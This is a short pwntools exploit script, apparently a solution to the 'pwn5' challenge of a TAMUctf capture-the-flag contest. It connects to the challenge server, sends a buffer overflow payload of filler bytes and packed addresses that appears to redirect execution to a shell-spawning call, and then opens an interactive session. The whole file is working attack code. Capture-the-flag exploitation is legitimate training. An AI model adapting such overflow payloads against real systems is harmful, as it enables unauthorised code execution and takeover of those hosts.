from pwn import *

#p = process('./pwn5')
p=remote("pwn.tamuctf.com",4325)
#gdb.attach(p)

p.recvuntil('Enter the arguments you would like to pass to ls:')
print '1'

payload='a'*13+p32(1)+p32(0x080488B3)+p32(0x80bc140)

p.sendline(payload)
#a=p.recvall()
#print a
p.interactive()